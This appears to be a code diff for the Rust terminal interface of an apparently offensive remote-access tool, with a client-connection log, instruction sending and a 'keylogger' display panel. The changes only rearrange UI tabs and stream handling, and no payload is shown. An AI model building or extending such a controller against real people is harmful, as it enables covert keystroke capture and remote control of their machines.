@@ -123,7 +123,6 @@ impl<'a> App<'a> {
     fn submit_instructions(&mut self) {
         self.core.apply_instructions(self.input.clone()).unwrap();
         self.instructions.push(self.input.clone());
-        self.messages.push(format!("handled instruction(-s): {}", self.input.clone()));
         self.input.clear();
         self.reset_cursor();
     }
@@ -139,7 +138,9 @@ impl<'a> App<'a> {
             match event {
                 ClientConnected(stream, addr) => {
                     self.messages.push(format!("[*] client is connected from {}", addr));
-                    self.core.start_client_reader(stream);
+
+                    let mut stream_guard = self.core.stream.lock().unwrap();
+                    *stream_guard = Some(stream);           
                 },
                 AppEvent::Terminal(key) => {
                     match key.code {
@@ -159,6 +160,7 @@ impl<'a> App<'a> {
                 },
             }
 
+            self.core.start_client_reader(); 
             terminal.draw(|frame| self.render(frame))?;
         };
         Ok(())
@@ -244,6 +246,55 @@ impl<'a> App<'a> {
     }
 
     fn draw_first_tab(&mut self, frame: &mut Frame, area: Rect) {
+        let block = Block::default()
+            .borders(Borders::ALL)
+            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
+            .title(Span::styled(
+                " ▸ EVENT LOG ",
+                Style::default()
+                    .fg(Color::Rgb(0, 200, 160))
+                    .add_modifier(Modifier::BOLD),
+            ))
+            .style(Style::default().bg(Color::Rgb(10, 10, 18)));
+
+        let messages: Vec<ListItem> = self
+            .messages
+            .iter()
+            .enumerate()
+            .map(|(i, m)| {
+                let (_prefix_style, text_style) = if m.starts_with("[*]") {
+                    (
+                        Style::default().fg(Color::Rgb(0, 200, 160)).add_modifier(Modifier::BOLD),
+                        Style::default().fg(Color::Rgb(180, 220, 210)),
+                    )
+                } else if m.starts_with("handled") {
+                    (
+                        Style::default().fg(Color::Rgb(180, 140, 255)).add_modifier(Modifier::BOLD),
+                        Style::default().fg(Color::Rgb(190, 190, 220)),
+                    )
+                } else {
+                    (
+                        Style::default().fg(Color::Rgb(80, 80, 120)),
+                        Style::default().fg(Color::Rgb(140, 140, 170)),
+                    )
+                };
+
+                let line = Line::from(vec![
+                    Span::styled(format!(" {:03} │ ", i + 1), Style::default().fg(Color::Rgb(40, 40, 70))),
+                    Span::styled(m.as_str(), text_style),
+                ]);
+                ListItem::new(line)
+            })
+            .collect();
+
+        let list = List::new(messages)
+            .block(block)
+            .highlight_style(Style::default().bg(Color::Rgb(20, 30, 40)));
+
+        frame.render_widget(list, area);
+    }
+
+    fn draw_second_tab(&mut self, frame: &mut Frame, area: Rect) {
         let chunks = Layout::vertical([
             Constraint::Fill(4),
             Constraint::Length(1), 
@@ -320,55 +371,6 @@ impl<'a> App<'a> {
         let keylogger = Paragraph::new(key_display)
             .block(keylogger_block);
         frame.render_widget(keylogger, chunks[2]);
-    }
-
-    fn draw_second_tab(&mut self, frame: &mut Frame, area: Rect) {
-        let block = Block::default()
-            .borders(Borders::ALL)
-            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
-            .title(Span::styled(
-                " ▸ EVENT LOG ",
-                Style::default()
-                    .fg(Color::Rgb(0, 200, 160))
-                    .add_modifier(Modifier::BOLD),
-            ))
-            .style(Style::default().bg(Color::Rgb(10, 10, 18)));
-
-        let messages: Vec<ListItem> = self
-            .messages
-            .iter()
-            .enumerate()
-            .map(|(i, m)| {
-                let (_prefix_style, text_style) = if m.starts_with("[*]") {
-                    (
-                        Style::default().fg(Color::Rgb(0, 200, 160)).add_modifier(Modifier::BOLD),
-                        Style::default().fg(Color::Rgb(180, 220, 210)),
-                    )
-                } else if m.starts_with("handled") {
-                    (
-                        Style::default().fg(Color::Rgb(180, 140, 255)).add_modifier(Modifier::BOLD),
-                        Style::default().fg(Color::Rgb(190, 190, 220)),
-                    )
-                } else {
-                    (
-                        Style::default().fg(Color::Rgb(80, 80, 120)),
-                        Style::default().fg(Color::Rgb(140, 140, 170)),
-                    )
-                };
-
-                let line = Line::from(vec![
-                    Span::styled(format!(" {:03} │ ", i + 1), Style::default().fg(Color::Rgb(40, 40, 70))),
-                    Span::styled(m.as_str(), text_style),
-                ]);
-                ListItem::new(line)
-            })
-            .collect();
-
-        let list = List::new(messages)
-            .block(block)
-            .highlight_style(Style::default().bg(Color::Rgb(20, 30, 40)));
-
-        frame.render_widget(list, area);
     }
 
     fn draw_third_tab(&mut self, frame: &mut Frame, area: Rect) {
